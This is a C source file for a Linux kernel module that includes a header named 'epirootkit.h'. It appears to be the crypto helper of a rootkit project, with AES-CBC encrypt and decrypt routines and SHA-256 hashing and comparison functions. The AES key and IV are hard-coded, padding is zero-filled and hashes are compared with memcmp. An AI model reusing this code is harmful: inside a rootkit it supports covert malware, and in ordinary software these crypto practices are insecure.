#include <crypto/hash.h>
#include <crypto/skcipher.h>
#include <linux/crypto.h>
#include <linux/err.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/scatterlist.h>
#include <linux/slab.h>
#include <linux/string.h>

#include "epirootkit.h"

#define AES_KEY "1234567890abcdef" // 16 bytes = 128 bits
#define AES_IV "abcdef1234567890"  // 16 bytes = bloc AES
#define AES_BLOCK_SIZE 16

int encrypt_buffer(const char *in, size_t in_len, char **out, size_t *out_len);
int decrypt_buffer(const char *in, size_t in_len, char **out, size_t *out_len);

static int _crypt_buffer(bool encrypt, const char *in, size_t in_len, char **out, size_t *out_len) {
    struct crypto_skcipher *tfm;
    struct skcipher_request *req;
    struct scatterlist sg;
    char *buf;
    int ret = 0;
    char iv[AES_BLOCK_SIZE];

    size_t padded_len = roundup(in_len, AES_BLOCK_SIZE);
    buf = kmalloc(padded_len, GFP_KERNEL);
    if (!buf)
        return -ENOMEM;

    memset(buf, 0, padded_len);
    memcpy(buf, in, in_len);
    memcpy(iv, AES_IV, AES_BLOCK_SIZE);

    tfm = crypto_alloc_skcipher("cbc(aes)", 0, 0);
    if (IS_ERR(tfm)) {
        kfree(buf);
        return PTR_ERR(tfm);
    }

    req = skcipher_request_alloc(tfm, GFP_KERNEL);
    if (!req) {
        crypto_free_skcipher(tfm);
        kfree(buf);
        return -ENOMEM;
    }

    if ((ret = crypto_skcipher_setkey(tfm, AES_KEY, 16)) != 0) {
        printk(KERN_ERR "setkey failed: %d\n", ret);
        goto out_free;
    }

    sg_init_one(&sg, buf, padded_len);
    skcipher_request_set_crypt(req, &sg, &sg, padded_len, iv);

    if (encrypt)
        ret = crypto_skcipher_encrypt(req);
    else
        ret = crypto_skcipher_decrypt(req);

    if (ret) {
        printk(KERN_ERR "%s failed: %d\n", encrypt ? "encrypt" : "decrypt", ret);
        goto out_free;
    }

    *out = buf;
    *out_len = padded_len;

out_free:
    skcipher_request_free(req);
    crypto_free_skcipher(tfm);

    if (ret)
        kfree(buf);

    return ret;
}

int encrypt_buffer(const char *in, size_t in_len, char **out, size_t *out_len) {
    return _crypt_buffer(true, in, in_len, out, out_len);
}

int decrypt_buffer(const char *in, size_t in_len, char **out, size_t *out_len) {
    return _crypt_buffer(false, in, in_len, out, out_len);
}

int hash_string(const char *input, u8 *digest);
bool are_hash_equals(const u8 *h1, const u8 *h2);
void hash_to_str(const u8 *digest, char *output);

int hash_string(const char *input, u8 *digest) {
    struct crypto_shash *tfm;
    struct shash_desc *shash;
    char *desc_buffer;
    int desc_size, ret;

    if (!input || !digest)
        return -EINVAL;

    tfm = crypto_alloc_shash("sha256", 0, 0);
    if (IS_ERR(tfm)) {
        pr_err("Erreur allocation tfm SHA-256\n");
        return PTR_ERR(tfm);
    }

    desc_size = sizeof(struct shash_desc) + crypto_shash_descsize(tfm);
    desc_buffer = kmalloc(desc_size, GFP_KERNEL);
    if (!desc_buffer) {
        crypto_free_shash(tfm);
        return -ENOMEM;
    }

    shash = (struct shash_desc *)desc_buffer;
    shash->tfm = tfm;
    // shash->flags = 0;

    ret = crypto_shash_digest(shash, input, strlen(input), digest);

    kfree(desc_buffer);
    crypto_free_shash(tfm);

    return ret;
}

bool are_hash_equals(const u8 *h1, const u8 *h2) {
    if (!h1 || !h2)
        return false;

    return (memcmp(h1, h2, SHA256_DIGEST_SIZE) == 0) ? true : false;
}

void hash_to_str(const u8 *digest, char *output) {
    int i;

    if (!digest || !output) {
        pr_err("hash_to_str: digest or output NULL\n");
        return;
    }

    for (i = 0; i < SHA256_DIGEST_SIZE; i++)
        sprintf(output + (i * 2), "%02x", digest[i]);
    output[SHA256_DIGEST_SIZE * 2] = '\0';
}
